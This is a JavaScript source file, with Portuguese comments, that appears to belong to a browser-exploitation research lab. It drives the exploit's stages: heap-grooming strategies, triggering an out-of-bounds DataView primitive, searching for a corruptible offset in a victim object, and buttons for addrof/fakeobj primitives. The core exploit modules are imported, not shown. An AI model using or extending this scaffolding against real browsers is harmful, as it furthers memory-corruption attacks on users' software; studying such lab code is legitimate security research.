// js/app.mjs
import { log as appLog, PAUSE_LAB } from './utils.mjs';
import * as Int64Lib from './int64.mjs';
import * as Core from './core_exploit.mjs';
import * as Groomer from './heap_groomer.mjs';
import * as Corruptor from './victim_corruptor.mjs';
import * as PostExploit from './post_exploit_conceptual.mjs';
import { updateOOBConfigFromUI as updateGlobalOOBConfig } from './config.mjs';

const App = {
    exploitSuccessful: false, // Flag para indicar se um GAP de sucesso definitivo foi encontrado
    isCurrentlyRunningStrategies: false, // Flag para evitar execuções concorrentes

    runAllGroomingStrategies: async () => {
        const FNAME_STRAT = "App.runAllGroomingStrategies";

        if (App.isCurrentlyRunningStrategies) {
            appLog("As estratégias de grooming já estão em execução. Aguarde a conclusão.", "warn", FNAME_STRAT);
            return;
        }
        if (App.exploitSuccessful) {
            appLog("Um GAP de sucesso definitivo já foi encontrado. Para reexecutar, reinicie o laboratório.", "warn", FNAME_STRAT);
            return;
        }

        App.isCurrentlyRunningStrategies = true;
        const btnRunStrategies = document.getElementById('btnRunGroomingStrategies');
        if (btnRunStrategies) btnRunStrategies.disabled = true;

        appLog(`--- Iniciando ${FNAME_STRAT} ---`, 'test', FNAME_STRAT);
        updateGlobalOOBConfig();
        const spray_count_el = document.getElementById('sprayCountBase');
        const intermediate_allocs_el = document.getElementById('intermediateAllocs');

        const spray_count = spray_count_el ? parseInt(spray_count_el.value) || 500 : 500;
        const intermediate_allocs = intermediate_allocs_el ? parseInt(intermediate_allocs_el.value) || 100 : 100;

        const strategies = [
            { victim_first: true, oob_first: false, spray_adj: 0, inter_adj: 0, name: "Vítima primeiro, OOB depois (Padrão)"},
            { victim_first: false, oob_first: true, spray_adj: 0, inter_adj: 0, name: "OOB primeiro, Vítima depois"},
            { victim_first: true, oob_first: false, spray_adj: 200, inter_adj: 50, name: "Vítima primeiro, Spray Maior"},
            { victim_first: false, oob_first: true, spray_adj: -100, inter_adj: -20, name: "OOB primeiro, Spray Menor"},
        ];
        Corruptor.resetLastSuccessfulGap();

        for (const strat of strategies) {
            if (Corruptor.getLastSuccessfulGap() !== null) { // Checa se uma estratégia anterior já teve sucesso
                appLog("GAP de sucesso encontrado por uma estratégia anterior. Interrompendo mais estratégias.", "good", FNAME_STRAT);
                App.exploitSuccessful = true;
                break;
            }
            appLog(`*** Iniciando Estratégia de Grooming: ${strat.name} ***`, "critical", FNAME_STRAT);

            let victimPrepared = false;
            let currentOOBAllocationSize = Core.getOOBAllocationSize();
            appLog(`   Estratégia '${strat.name}' usando OOB_ALLOCATION_SIZE: ${currentOOBAllocationSize}`, "info", FNAME_STRAT);

            if (strat.oob_first) {
                appLog(`   Estratégia '${strat.name}': OOB será ativado primeiro.`, "info", FNAME_STRAT);
                await Core.triggerOOB_primitive();
                if (!Core.oob_dataview_real) { appLog("Falha ao ativar OOB (OOB primeiro), pulando estratégia.", "error", FNAME_STRAT); await PAUSE_LAB(500); continue; }
                await Groomer.groomHeapForSameSize(spray_count + strat.spray_adj, currentOOBAllocationSize, intermediate_allocs + strat.inter_adj, false);
                victimPrepared = await Groomer.prepareVictim(currentOOBAllocationSize);
            } else {
                appLog(`   Estratégia '${strat.name}': Vítima será preparada primeiro.`, "info", FNAME_STRAT);
                await Groomer.groomHeapForSameSize(spray_count + strat.spray_adj, currentOOBAllocationSize, intermediate_allocs + strat.inter_adj, true);
                victimPrepared = await Groomer.prepareVictim(currentOOBAllocationSize);
                if (victimPrepared) {
                    appLog(`   Estratégia '${strat.name}': Vítima preparada, ativando OOB agora.`, "info", FNAME_STRAT);
                    await Core.triggerOOB_primitive();
                    if (!Core.oob_dataview_real) { appLog("Falha ao ativar OOB (após vítima), pulando estratégia.", "error", FNAME_STRAT); await PAUSE_LAB(500); continue; }
                }
            }

            appLog(`   Estratégia '${strat.name}': Status Pós-Preparação -> victimPrepared: ${victimPrepared}, Groomer.victim_object existe: ${!!Groomer.victim_object}`, "info", FNAME_STRAT);
            if (Groomer.victim_object && victimPrepared) { // Adicionado victimPrepared aqui
                appLog(`      Groomer.victim_object.length: ${Groomer.victim_object.length}`, "info", FNAME_STRAT);
            }

            if (!victimPrepared) {
                appLog(`   Estratégia '${strat.name}': Falha ao preparar vítima (victimPrepared é false). Pulando corrupção.`, "error", FNAME_STRAT);
                await PAUSE_LAB(500); continue;
            }
            if (!Groomer.victim_object) {
                 appLog(`   Estratégia '${strat.name}': ERRO CRÍTICO: Groomer.victim_object é null ANTES de chamar findAndCorrupt. Pulando corrupção.`, "error", FNAME_STRAT);
                 await PAUSE_LAB(500); continue;
            }
            if (!Core.oob_dataview_real) {
                appLog(`   Estratégia '${strat.name}': ERRO CRÍTICO: Primitiva OOB não está ativa ANTES de chamar findAndCorrupt. Pulando corrupção.`, "error", FNAME_STRAT);
                await PAUSE_LAB(500); continue;
            }

            appLog(`   Estratégia '${strat.name}': Vítima OK, OOB OK. Tentando corrupção...`, "info", FNAME_STRAT);
            await Corruptor.findAndCorruptVictimFields_Iterative(); // Esta função define Corruptor.last_successful_gap

            if (Corruptor.getLastSuccessfulGap() !== null) { // Verifica imediatamente após a tentativa de corrupção
                appLog(`GAP de sucesso encontrado pela estratégia '${strat.name}'! Interrompendo mais estratégias.`, "good", FNAME_STRAT);
                App.exploitSuccessful = true;
                break; // Sai do loop de estratégias
            }
            await PAUSE_LAB(2000); // Pausa entre estratégias se nenhum GAP foi encontrado ainda
        } // Fim do loop for (const strat of strategies)

        appLog(`--- ${FNAME_STRAT} Concluído ---`, 'test', FNAME_STRAT);
        if (Corruptor.getLastSuccessfulGap() !== null) {
            appLog(`GAP de SUCESSO encontrado e armazenado: ${Corruptor.getLastSuccessfulGap()}.`, "vuln", FNAME_STRAT);
            App.exploitSuccessful = true;
            const addrofGapEl = document.getElementById('addrofGap');
            if (addrofGapEl) addrofGapEl.value = Corruptor.getLastSuccessfulGap();
            if (btnRunStrategies) btnRunStrategies.textContent = "GAP Encontrado!"; // Muda o texto e mantém desabilitado
            // Não reabilita o botão aqui se foi sucesso
        } else {
            appLog("Nenhuma estratégia resultou em GAP de sucesso.", "error", FNAME_STRAT);
            if (btnRunStrategies) btnRunStrategies.disabled = false; // Reabilita se não houve sucesso
        }
        App.isCurrentlyRunningStrategies = false;
    }, // Fim de runAllGroomingStrategies

    updateCurrentTestGapFromScanUIAndTestSingle: () => {
        const gapStartScanEl = document.getElementById('gapStartScan');
        const gapVal = gapStartScanEl ? parseInt(gapStartScanEl.value) : NaN;

        if (!isNaN(gapVal)) {
            Corruptor.setCurrentTestGap(gapVal);
            appLog(`CURRENT_TEST_GAP (teste único) atualizado para: ${Corruptor.getCurrentTestGap()} bytes.`, 'tool', 'App.Config');
            if (!Groomer.victim_object || !Core.oob_dataview_real) {
                appLog("ERRO: Vítima ou primitiva OOB não estão prontas para teste de GAP único. Execute os Passos 0 e 1 (ou uma estratégia de grooming).", "error", "App.Config");
                return;
            }
            Corruptor.try_corrupt_fields_for_gap(Corruptor.getCurrentTestGap());
        } else { appLog("Valor de GAP inválido.", "error", "App.Config"); }
    },

    setupUIEventListeners: () => {
        const moduleTestButtonsContainer = document.getElementById('moduleTestButtons');
        if (moduleTestButtonsContainer) {
            moduleTestButtonsContainer.innerHTML = '';
            const btnTestInt64 = document.createElement('button');
            btnTestInt64.textContent = 'Testar Módulo Int64';
            btnTestInt64.onclick = () => Int64Lib.testModule(appLog);
            moduleTestButtonsContainer.appendChild(btnTestInt64);

            const btnTestUtils = document.createElement('button');
            btnTestUtils.textContent = 'Testar Módulo Utils';
            btnTestUtils.onclick = () => import('./utils.mjs').then(utils => utils.testModule());
            moduleTestButtonsContainer.appendChild(btnTestUtils);

            const btnTestCore = document.createElement('button');
            btnTestCore.textContent = 'Testar Módulo CoreExploit (OOB)';
            btnTestCore.onclick = Core.testModule;
            moduleTestButtonsContainer.appendChild(btnTestCore);

            const notes = document.createElement('p');
            notes.className = 'notes';
            notes.textContent = 'Módulos HeapGroomer e VictimCorruptor são testados através dos fluxos principais. PostExploit é conceitual.';
            moduleTestButtonsContainer.appendChild(notes);
        }

        document.getElementById('btnTriggerOOB')?.addEventListener('click', Core.triggerOOB_primitive);
        document.getElementById('btnRunGroomingStrategies')?.addEventListener('click', App.runAllGroomingStrategies);
        document.getElementById('btnTestSingleGap')?.addEventListener('click', App.updateCurrentTestGapFromScanUIAndTestSingle);
        document.getElementById('btnFindAndCorruptIterative')?.addEventListener('click', Corruptor.findAndCorruptVictimFields_Iterative);
        document.getElementById('btnTestKnownGap')?.addEventListener('click', Corruptor.testCorruptKnownGap);
        document.getElementById('btnSetupAddrofConceptual')?.addEventListener('click', PostExploit.setup_addrof_fakeobj_pair_conceptual);
        document.getElementById('btnTestAddrofConceptual')?.addEventListener('click', PostExploit.test_addrof_conceptual);
        document.getElementById('btnTestFakeobjConceptual')?.addEventListener('click', PostExploit.test_fakeobj_conceptual);

        document.getElementById('oobAllocSize')?.addEventListener('change', updateGlobalOOBConfig);
        document.getElementById('baseOffset')?.addEventListener('change', updateGlobalOOBConfig);
        document.getElementById('initialBufSize')?.addEventListener('change', updateGlobalOOBConfig);
    },

    initialize: () => {
        updateGlobalOOBConfig();
        App.setupUIEventListeners();
        App.exploitSuccessful = false; // Reseta a flag de sucesso da sessão
        App.isCurrentlyRunningStrategies = false; // Reseta a flag de execução
        const btnRunStrategies = document.getElementById('btnRunGroomingStrategies');
        if (btnRunStrategies) {
            btnRunStrategies.disabled = false; // Garante que o botão está habilitado no início
            btnRunStrategies.textContent = "Executar Todas Estratégias de Grooming & Busca de GAP";
        }
        appLog("Laboratório Modularizado (v2.8.4 - Controle Exec Estratégias) pronto.", "good", "App.Init");

        const addrofGapEl = document.getElementById('addrofGap');
        if (addrofGapEl) addrofGapEl.value = ""; // Limpa o campo de GAP para addrof
    }
};

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', App.initialize);
} else {
    App.initialize();
}

appLog("app.mjs carregado e pronto.", "info", "Global");
